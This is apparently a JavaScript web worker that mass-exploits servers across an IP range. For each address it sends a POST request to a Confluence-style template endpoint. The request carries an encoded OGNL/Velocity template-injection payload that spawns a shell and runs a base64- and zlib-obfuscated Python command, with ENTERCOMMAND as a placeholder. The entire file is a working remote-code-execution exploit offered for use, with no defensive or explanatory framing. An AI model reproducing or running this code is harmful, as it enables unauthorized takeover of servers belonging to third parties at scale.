async function sendRequest(ip) {
    return new Promise((resolve, reject) => {
        const xhr = new XMLHttpRequest();
        const url = `http://${ip}/template/aui/text-inline.vm`;
        xhr.open('POST', url, true);

        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        //xhr.setRequestHeader('User-Agent','Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36');

        // Handle the response
        xhr.onload = function() {
            if (xhr.status >= 200 && xhr.status < 300) {
                resolve({ ip, status: 'success', response: xhr.status });
            } else {
                reject({ ip, status: 'error', response: xhr.status });
            }
        };

        xhr.onerror = function() {
            reject({ ip, status: 'error', error: xhr.statusText });
        };

        // Prepare the URL-encoded data
        const data = "label=\u0027%2b%23request.get%28\u0027.KEY_velocity.struts2.context\u0027%29.internalGet%28\u0027ognl\u0027%29.findValue%28%23parameters.uPo24zSPe%2c%7b%7d%29%2b\u0027&uPo24zSPe=%28new%20freemarker.template.utility.Execute%28%29%29.exec%28%7b%40org.apache.struts2.ServletActionContext%40getRequest%28%29.getParameter%28%27OpNxBq%27%29%7d%29&OpNxBq=sh%20-c%20%24%40%7csh%20.%20echo%20echo%20exec\%28__import__\%28\%27zlib\%27\%29.decompress\%28__import__\%28\%27base64\%27\%29.b64decode\%28__import__\%28\%27codecs\%27\%29.getencoder\%28\%27utf-8\%27\%29\%28\%27ENTERCOMMAND\%27\%29\%5b0\%5d\%29\%29\%29%20%7c%20exec%20%24%28which%20python%20%7c%7c%20which%20python3%20%7c%7c%20which%20python2%29%20-";

        // Send the request
        xhr.send(data);
    });
}

onmessage = async function(e) {
    const ipRange = e.data.range;
    let results = [];
    for (let ip of ipRange) {
        try {
            const result = await sendRequest(ip);
            results.push(result);
        } catch (error) {
            console.error(`Error for IP ${ip}:`, error);
            results.push(error);
        }
    }
    postMessage(results);
};
